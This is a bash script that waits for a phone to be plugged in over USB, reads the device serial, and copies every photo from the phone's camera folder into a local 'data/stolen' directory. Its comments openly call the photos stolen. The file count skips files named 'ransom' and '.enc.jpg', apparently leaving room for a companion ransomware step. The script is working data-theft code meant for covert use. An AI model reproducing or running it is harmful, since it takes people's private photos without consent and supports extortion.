#!/bin/bash
####################################################This is where the script will wait for a phone to be plugged in before copying the pictures taken by its camera locally.######################

oldusblist=$(lsusb)
"./wait-for-phone.sh"
LOCALPATH=$(pwd)
PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/Camera)
echo $PHONEPATH
#################################################################################################################################################################################




##################Make a folder to keep the files that have been stolen. Where I have given the folder a name based on the device's name and the current time.#################################################
cd data/stolen
informationaboutthedevice=$(lsusb | grep -v "$oldusblist")
devicebus=$(echo $informationaboutthedevice | awk -F' |: ' '/Device /{gsub(" "," ");print $2}')
numberofthedevice=$(echo $informationaboutthedevice | awk -F' |: ' '/Device /{gsub(" "," ");print $4}')

DEVICEID=$(udevadm info --name=/dev/bus/usb/$devicebus/$numberofthedevice | awk -F'=' '/ID_SERIAL=/{gsub("_"," ");print $2}')

currenttime=$(date)
TRANSDIR="$DEVICEID $currenttime"
mkdir "$TRANSDIR"



cd "$PHONEPATH"

newfile=1
filecounter=$(ls -1 | grep -v "ransom" | grep -v ".enc.jpg" | wc -l)

for f in *
do 
		echo "transferring $f ($newfile/$filecounter)..."
		gvfs-copy "$f" "$LOCALPATH/data/stolen/$TRANSDIR"
		newfile=$((newfile+1))
done
cd "$LOCALPATH"


echo ""

echo Transfer complete. Pictures stored in "data/stolen/$TRANSDIR"
echo ""
#########################################################################################THE END###################################################################################